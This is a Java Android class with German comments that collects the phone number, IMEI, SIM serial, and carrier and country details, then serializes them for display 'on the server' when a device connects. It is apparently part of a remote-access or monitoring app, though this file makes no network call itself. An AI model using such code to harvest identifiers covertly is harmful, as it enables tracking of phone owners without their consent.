package my.app.Library;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.util.Hashtable;

import android.content.Context;
import android.telephony.TelephonyManager;

/**
 * Diese Klasse sammelt die grundlegenden Informationen, die auf dem Server angezeigt werden, sobald sich das Gerät verbindet.
 * Hierzugehört die Telefonnummer, die IMEI, die Länderkennung, der Name des Anbieters, die Länderkennung der Simkarte
 * der Anbieter der Simkarte und die Seriennummer des Simkarte.
 */
public class SystemInfo {
	/**
	 * Die Klassenvariablen sind
	 * ctx Der Kontext
	 * tm Der Telefonmanager
	 */
	Context ctx;
	TelephonyManager tm;

	/**
	 * Konstruktor der Klasse. Hier werden die Klassenvariablen befüllt.
	 * @param c Der Kontext
	 */
	public SystemInfo(Context c) {
		ctx = c;
		tm = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
	}

	/**
	 * Diese Methode gibt die Telefonnummer des Geräts zurück.
	 * @return Die Telefonnummer
	 */
	public String getPhoneNumber() {
		return tm.getLine1Number();
	}

	/**
	 * Diese Methode gibt die eindeutige Seriennummer des Grätes zurück.
	 * @return Die IMEI des Gerätes.
	 */
	public String getIMEI() {
		return tm.getDeviceId();
	}

	/**
	 * Diese Methode liefert die Länderkennung.
	 * @return Die Länderkennung.
	 */
	public String getCountryCode() {
		return tm.getNetworkCountryIso();
	}

	/**
	 * Diese Methode liefert den Namen des Anbierters.
	 * @return Name des Anbieters.
	 */
	public String getOperatorName() {
		return tm.getNetworkOperatorName();
	}

	/**
	 * Diese Methode liefert die Länderkennung der Simkarte.
	 * @return Die Länderkennung der Simkarte.
	 */
	public String getSimCountryCode() {
		return tm.getSimCountryIso();
	}

	/**
	 * Diese Methode gibt den Namen des Simkartenanbieters zurück
	 * @return Name des Simkartenanbieters
	 */
	public String getSimOperatorName() {
		return tm.getSimOperatorName();
	}

	/**
	 * Diese Methode liefert die Seriennummer der Simkarte.
	 * @return Die Seriennummer der Simkarte.
	 */
	public String getSimSerial() {
		return tm.getSimSerialNumber();
	}

	/**
	 * Diese Methode ruft die oberen Methoden auf und verpackt die Informationen in einem Byte-Array.
	 * @return Das Byte-Array mit der IMEI, der Telefonummer, der Länderkennung, des Anbieternamens, der Simkartenländerkennung,
	 * dem Simkartenanbieternamen und der Simkartenseriennummern.
	 */
	public byte[] getBasicInfos() {
		/**
		 * In dieser Hashtable werden die Daten gespeichert.
		 */
		Hashtable<String, String> h = new Hashtable<String, String>();
		String res;
		/**
		 * Im folgenden werden alle obigen Methoden aufgerufen und überprüft, ob diese ein Ergebnis liefern.
		 * Sollte dies der Fall sein, werden die entsprechenden Daten zusammen mit ihrem Key der Hashtabelle hinzugefügt.
		 */
		res = getIMEI();
		if(res != null)
			h.put("IMEI", res);
		res = getPhoneNumber();
		if(res != null)
			h.put("PhoneNumber", res);
		res = getCountryCode();
		if(res != null)
			h.put("Country", res);
		res = getOperatorName();
		if(res != null)
			h.put("Operator",res);
		res = getSimCountryCode();
		if(res != null)
			h.put("SimCountry", res);
		res = getSimOperatorName();
		if(res != null)
			h.put("SimOperator", res);
		res= getSimSerial();
		if(res != null)
			h.put("SimSerial", res);
		/**
		 * Zum Schluss wird, versucht diese Hashtabelle in ein ByteArray umzuwandelt.
		 * Sollte dies erfolgreich sein, wird das ByteArray zurückgegeben.
		 * Ansonsten wird null zurückgegeben.
		 */
		try {
			ByteArrayOutputStream bos = new ByteArrayOutputStream();
			ObjectOutputStream out = new ObjectOutputStream(bos);
			out.writeObject(h);
			return bos.toByteArray();
		} catch (IOException e) {
			return null;
		}
	}
	

	
}
